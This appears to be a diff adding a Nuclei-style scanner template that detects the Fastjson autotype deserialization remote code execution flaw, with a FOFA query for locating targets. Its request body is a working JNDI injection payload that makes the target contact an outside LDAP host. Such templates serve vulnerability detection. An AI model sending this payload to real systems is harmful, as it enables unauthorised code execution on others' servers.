@@ -1,0 +1,28 @@
+id: fastjson-deserialization-rce
+
+info:
+  name: Fastjson 反序列化远程代码执行漏洞
+  author: god
+  severity: critical
+  description: Fastjson <= 1.2.68 反序列化漏洞，通过 autotype 执行任意代码
+  metadata:
+    fofa-query: app="Fastjson"
+  tags: fastjson,deserialization,rce,java
+
+http:
+- raw:
+  - |
+    @timeout: 30s
+    POST / HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+
+    {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}/Exploit","autoCommit":true}
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      words:
+        - "dns"
+      part: interactsh_protocol
